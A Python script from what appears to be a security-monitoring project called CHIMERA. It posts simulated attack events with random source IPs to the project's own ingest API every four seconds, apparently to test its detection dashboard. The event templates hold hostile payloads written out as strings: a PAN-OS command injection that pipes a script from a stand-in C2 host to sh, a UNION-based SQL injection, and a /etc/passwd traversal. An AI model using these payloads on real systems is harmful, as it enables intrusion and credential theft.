"""
backend/attack_simulator.py

CHIMERA Live Attack Traffic Simulator
Continuously feeds realistic threat vectors and decoy triggers with true-randomized
unique IP addresses into the FastAPI ingest pipeline at exactly 4-second intervals.
"""

import os
import time
import random
import sys
from datetime import datetime, timezone
import requests

TARGET_URL = os.getenv("TARGET_URL", "https://chimera-backend-5jwu.onrender.com/api/ingest")

# ANSI Color Codes for terminal formatting
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# Attack payload templates across Honeypot and Gateway targets
ATTACK_TEMPLATES = [
    {
        "name": "Decoy Honeypot Trap (/decoy/db-admin)",
        "endpoint": "/decoy/db-admin",
        "method": "POST",
        "headers": {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        "body": "SELECT * FROM chimera_admin_credentials;",
        "attack_type": "Honeypot Trap Interaction",
    },
    {
        "name": "Decoy SSH Honeypot (/decoy/ssh-login)",
        "endpoint": "/decoy/ssh-login",
        "method": "POST",
        "headers": {"user-agent": "libssh/0.9.6"},
        "body": '{"username": "root", "key": "ssh-rsa AAAAB3NzaC1yc2E..."}',
        "attack_type": "Decoy SSH Interaction",
    },
    {
        "name": "SSH / Auth Credential Stuffing",
        "endpoint": "/api/v1/auth/login",
        "method": "POST",
        "headers": {"user-agent": "python-requests/2.31.0", "content-type": "application/json"},
        "body": '{"username": "admin", "password": "Password123!"}',
        "attack_type": "Credential Stuffing Campaign",
    },
    {
        "name": "PAN-OS RCE Exploit (CVE-2024-3400)",
        "endpoint": "/ssl-vpn/hipreport.esp",
        "method": "POST",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "COOKIE: `curl http://c2.malicious.net/shell.sh | sh`",
        "attack_type": "PAN-OS Command Injection (CVE-2024-3400)",
    },
    {
        "name": "SQLi Exploit (CVE-2024-SQLi-Extraction)",
        "endpoint": "/api/v1/users?id=1",
        "method": "GET",
        "headers": {"user-agent": "sqlmap/1.7.2#stable"},
        "body": "id=1' UNION SELECT null, username, password_hash FROM users--",
        "attack_type": "SQL Injection (UNION-based Extraction)",
    },
    {
        "name": "Directory Traversal / LFI (/etc/passwd)",
        "endpoint": "/api/v1/files?path=../../../../../../etc/passwd",
        "method": "GET",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "",
        "attack_type": "Directory Traversal / LFI",
    },
    {
        "name": "Admin Portal Recon (/admin/config)",
        "endpoint": "/admin/config",
        "method": "GET",
        "headers": {"user-agent": "Go-http-client/1.1"},
        "body": "",
        "attack_type": "Admin Surface Enumeration",
    },
    {
        "name": "API Telemetry Recon (/metrics)",
        "endpoint": "/metrics",
        "method": "GET",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "",
        "attack_type": "Internal Reconnaissance & Metrics Probe",
    },
]


def run_simulator():
    print(f"\n{BOLD}{'=' * 80}{RESET}")
    print(f"{BOLD}{CYAN}  🔥 CHIMERA CONTINUOUS ATTACK SIMULATOR & TELEMETRY INJECTOR 🔥{RESET}")
    print(f"{DIM}  Target Endpoint : {TARGET_URL}{RESET}")
    print(f"{DIM}  Interval        : Exactly 4 seconds (Local Time Timestamps){RESET}")
    print(f"{DIM}  IP Generation   : True Random Unique IPv4 addresses{RESET}")
    print(f"{BOLD}{'=' * 80}{RESET}\n")

    counter = 0

    while True:
        counter += 1

        # True randomized unique IP generation for every single attack
        source_ip = f"{random.randint(11,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

        template = random.choice(ATTACK_TEMPLATES)
        attack_name = template["name"]
        endpoint = template["endpoint"]
        method = template["method"]
        headers = template["headers"]
        body = template["body"]
        attack_type = template["attack_type"]

        now_dt = datetime.now(timezone.utc)
        now_iso = now_dt.isoformat()
        local_time_str = datetime.now().strftime("%H:%M:%S")

        # Dynamic risk score
        random_score = round(random.uniform(0.65, 0.98), 2)

        payload = {
            "source_ip": source_ip,
            "destination_ip": "10.0.0.5",
            "endpoint": endpoint,
            "method": method,
            "headers": headers,
            "body": body,
            "timestamp": now_iso,
            "anomaly_score": random_score,
            "risk_score": random_score,
            "attack_type": attack_type,
        }

        try:
            response = requests.post(TARGET_URL, json=payload, timeout=15)
            status_code = response.status_code

            if status_code == 200:
                data = response.json()
                action = str(data.get("action", "unknown")).upper()
                risk_score = float(data.get("risk_score", random_score))
                event_id = str(data.get("event_id", ""))[:8]

                if action in ("ESCALATED", "APPROVAL_REQ", "DECEPTION_ACTIVE"):
                    tag_color = RED if action != "DECEPTION_ACTIVE" else YELLOW
                    icon = "🚨 [APPROVAL_REQ]" if action == "APPROVAL_REQ" else ("⚡ [DECOY_TRAP] " if action == "DECEPTION_ACTIVE" else "🔥 [ESCALATED]  ")
                elif action == "AUTO_CONTAINED":
                    tag_color = CYAN
                    icon = "🛡️  [AUTONOMOUS]  "
                else:
                    tag_color = GREEN
                    icon = "✅ [BENIGN/DROP] "

                print(
                    f"[{local_time_str}] #{counter:03d} "
                    f"{tag_color}{icon:<18}{RESET} "
                    f"HTTP {GREEN}{status_code}{RESET} | "
                    f"{BOLD}{endpoint:<30}{RESET} | "
                    f"IP: {CYAN}{source_ip:<15}{RESET} | "
                    f"Score: {tag_color}{risk_score:.2f}{RESET} | "
                    f"{DIM}{attack_name}{RESET} ({event_id}...)"
                )
            else:
                print(
                    f"[{local_time_str}] #{counter:03d} "
                    f"{RED}[HTTP {status_code}]{RESET} "
                    f"Target {endpoint} responded with: {response.text[:60]}"
                )

        except requests.exceptions.ConnectionError:
            print(
                f"[{local_time_str}] #{counter:03d} "
                f"{RED}[CONN_ERROR]{RESET} Cannot connect to {TARGET_URL}. Is the backend online?"
            )
        except Exception as exc:
            print(
                f"[{local_time_str}] #{counter:03d} "
                f"{RED}[ERROR]{RESET} {exc}"
            )

        time.sleep(4)


if __name__ == "__main__":
    try:
        run_simulator()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[SIMULATOR] Simulator stopped by user. Goodbye!{RESET}\n")
        sys.exit(0)
